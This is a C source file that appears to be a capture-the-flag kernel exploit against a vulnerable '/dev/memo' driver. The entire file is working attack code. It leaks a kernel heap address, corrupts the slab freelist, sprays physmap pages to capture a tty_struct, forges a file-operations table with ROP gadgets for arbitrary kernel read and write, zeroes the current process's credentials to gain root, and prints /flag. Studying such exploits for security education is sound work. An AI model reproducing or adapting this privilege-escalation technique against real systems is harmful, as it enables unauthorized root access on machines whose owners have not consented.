#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <pty.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define LOG(f_, ...) printf(("[*] " f_), __VA_ARGS__)
#define SPRAY_CNT 32*32*32
#define PAGESIZE 0x1000
#define TASKS_OFFSET 0x388
#define CRED_OFFSET 0x620
#define PID_OFFSET 0x488
void *sprayed_pages[SPRAY_CNT];
char zeropage[PAGESIZE];

int fd;
int slave_fd;
unsigned long kernel_base;
unsigned long r_gadget;
unsigned long w_gadget;
unsigned long init_task;
unsigned long setup_disble_smap;
unsigned long ftable[0x80];

struct skewBuf {
	unsigned char blank;
	unsigned long vec[127];
	unsigned char leftover[7];
}  __attribute__((packed));

int Open(const char *fname, int mode) {
	int fd = open(fname, mode);
	if (fd < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

size_t Read(int fd, void *buf, size_t nbytes) {
	size_t nb = read(fd, buf, nbytes);
	if (nb != nbytes) {
		perror("read");
		exit(-1);
	}
	return nb;
}

size_t Write(int fd, void *buf, size_t nbytes) {
	size_t nb = write(fd, buf, nbytes);
	if (nb != nbytes) {
		perror("write");
		exit(-1);
	}
	return nb;
}

void physmap_spray() {
	int i;
	void *mp;
	for (i = 0; i < SPRAY_CNT; i++)
	{
        if ((mp = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0 )) == MAP_FAILED) {
        	perror("mmap");
        	exit(-1);
        }
		sprayed_pages[i] = mp;
	}	
}

unsigned long get_pfn(void *pg) {
	unsigned long pginfo;
	int fd = Open("/proc/self/pagemap", O_RDWR);
	if (lseek(fd, ((off_t)pg >> 12) * sizeof(pginfo), SEEK_SET) < 0) {
		perror("lseek");
		exit(-1);
	}

	if (read(fd, &pginfo, sizeof(pginfo)) < 0) {
		perror("read");
		exit(-1);
	}
	close(fd);
	unsigned long pfn = pginfo & 0x7fffffffffffff;
	return pfn;
}

void list_pfn() {
	int i;
	for (i = 0; i < SPRAY_CNT; i++) {
		printf("PFN[%d] = %lx\n", i, get_pfn(sprayed_pages[i]));
	}
}

void *page_hit() {
	int i;
	for (i = 0; i < SPRAY_CNT; i++) {
		if (memcmp(sprayed_pages[i], zeropage, PAGESIZE)) {
			return sprayed_pages[i];
		}
	}
	return NULL;
}

int get_ptmx_slave(int ptmx_fd) {
	const char *pts_name;
	if (grantpt(ptmx_fd) < 0) {
		perror("grantpt");
		exit(-1);
	}
	if (unlockpt(ptmx_fd) < 0) {
		perror("unlockpt");
		exit(-1);
	}

	pts_name = (const char *)ptsname(ptmx_fd);
	return Open(pts_name, O_RDWR|O_NOCTTY);
}

unsigned int sys_ioctl(int fd, int cmd, unsigned long aux) {
	asm volatile("mov $16, %rax");
	asm volatile("syscall");
}

void write32(unsigned int what, unsigned long where) {
	ftable[0] = kernel_base + 0xffffffff81419300 - 0xffffffff80e00000;
	ftable[3] = kernel_base + 0xffffffff81418e60 - 0xffffffff80e00000;
	ftable[12] = w_gadget;
	lseek(fd, 0, SEEK_SET);
	Write(fd, ftable, 0x400);
	ioctl(slave_fd, (what), (where)); 
}

unsigned int read32(unsigned long where) {
	ftable[0] = kernel_base + 0xffffffff81419300 - 0xffffffff80e00000;
	ftable[3] = kernel_base + 0xffffffff81418e60 - 0xffffffff80e00000;
	ftable[12] = r_gadget;
	lseek(fd, 0, SEEK_SET);
	Write(fd, ftable, 0x400);
	return sys_ioctl(slave_fd, 0x1, where - 0x28); 
}

void write64(unsigned long what, unsigned long where) {
	unsigned long part;
	part = what & 0xFFFFFFFF;
	write32((unsigned int )part, where);
	part = what >> 32;
	write32((unsigned int )part, where + 4);
}

unsigned long read64(unsigned long where) {
	unsigned long p1, p2;
	p1 = read32(where);
	p2 = read32(where + 4);
	return p1 | (p2 << 32);
}

int check_page(unsigned long addr) {

	unsigned long page[0x101];
	int i;

	for (i = 0; i < 0x101; i++) {
		page[i] = read64(addr + i*8);
	}
	for (i = 0; i < 0x100; i++) {
		if (((page[i] & 0xff) != 0x67) || (!(page[i] >> 63))) {
			return 0;
		}
	}

	return page[0x100] == 0;
}

int main(int argc, char **argv) {

	char trash[0x3FF];
	struct skewBuf buf;
	int i;

	assert(sizeof(buf) == 0x400);
	memset(trash, 0xcc, sizeof(trash));

	// open the device
	fd = Open("/dev/memo", O_RDWR);
	
	// leak a SLAB address
	Write(fd, trash, sizeof(trash));
	Read(fd, &buf, sizeof(buf));
	unsigned long heapAddr = buf.vec[0];
	LOG("Got a kernel heap leak: %p\n", (void *)heapAddr);

	// overwrite the fd of next chunk to a 'guess'ed physmap address
	
	lseek(fd, 0x3FF, SEEK_SET);
	buf.vec[0] = heapAddr & 0xffffffffff000000;
	LOG("tty_struct will be allocated at address: %p\n", (void *)buf.vec[0]);
	Write(fd, &buf, sizeof(buf));

	// physmap spray
	physmap_spray();

	// allocate a ptmx object, it will be allocated to userspace mmap pages
	int tty_fd = Open("/dev/ptmx", O_RDWR|O_NOCTTY);
	unsigned long*pg = page_hit();
	if (!pg) {
		puts("[-] failed to get a tty_struct allocated in one of our pages");
		exit(-1);
	}

	LOG("now page %p is synonymous with tty_struct of fd %d\n", pg, tty_fd);

	// create fake fops
	// 0xffffffff810a0333: mov dword ptr [rdx], esi; ret; 
	// 0xffffffff81051543: mov rax, qword ptr [rdx + 0x28]; ret; 
	unsigned long fops = pg[3];
	kernel_base = fops - 0xffffffff81e65800 + 0xffffffff80e00000;
	w_gadget = kernel_base + 0xffffffff810a0333 - 0xffffffff80e00000;
	r_gadget = kernel_base + 0xffffffff81051543 - 0xffffffff80e00000;
	init_task = kernel_base + 0xFFFFFFFF82211740 - 0xffffffff80e00000;
	setup_disble_smap = kernel_base + 0xffffffff8a98f556 - 0xffffffff80e00000;

	for (i = 0; i < 0x80; i++) {
		ftable[i] = 0xdead0000 + i;
	}
	/*
	0xffffffff81e65800:	0xffffffff81419300	0xffffffff81419840
	0xffffffff81e65810:	0xffffffff81418ee0	0xffffffff81418e60
	0xffffffff81e65820:	0xffffffff814191a0	0x0000000000000000
	0xffffffff81e65830:	0xffffffff81419190	0xffffffff81419100
	0xffffffff81e65840:	0x0000000000000000	0x0000000000000000
	0xffffffff81e65850:	0xffffffff81419660	0xffffffff81418e50
	0xffffffff81e65860:	0x0000000000000000	0x0000000000000000
	0xffffffff81e65870:	0xffffffff81418f80	0x0000000000000000
	0xffffffff81e65880:	0xffffffff814190e0	0xffffffff814195f0
	*/
	ftable[0] = kernel_base + 0xffffffff81419300 - 0xffffffff80e00000;
	ftable[3] = kernel_base + 0xffffffff81418e60 - 0xffffffff80e00000;
	ftable[4] = kernel_base + 0xffffffff814191a0 - 0xffffffff80e00000;
	lseek(fd, 0, SEEK_SET);
	Write(fd, ftable, 0x400);
	
	LOG("fops is located at: %p\n", (void *)fops);
	LOG("kernel base: %p\n", (void *)kernel_base);

	pg[3] = heapAddr - 0x800; // memo address
	
	// enjoy arbitrary read and write
	slave_fd = get_ptmx_slave(tty_fd);

	// read page offset base
	unsigned long cur = init_task, cred;
	unsigned int pid;
	unsigned int this_pid = getpid();
	while(1) {
		pid = read32(cur + PID_OFFSET);
		if (pid == this_pid) {
			cred = read64(cur + CRED_OFFSET);
			LOG("Found current process(pid=%d)'s cred struct %p\n", pid, (void *)cred);
			LOG("original uid=%d, gid=%d. now escalating to root\n", read32(cred + 4), read32(cred + 8));
			write64(0x0, cred + 4);
			write64(0x0, cred + 12);
			write64(0x0, cred + 20);
			write64(0x0, cred + 28);
			LOG("now i am uid=%d\n", getuid());
			break;
		}
		cur = read64(cur + TASKS_OFFSET) - TASKS_OFFSET;
	}
	
	char flag[0x100];
	FILE *fp = fopen("/flag", "r");
	if (!fp) {
		perror("fopen");
		exit(-1);
	}
	fgets(flag, sizeof(flag), fp);
	printf("flag: %s\n", flag);

	return 0;
}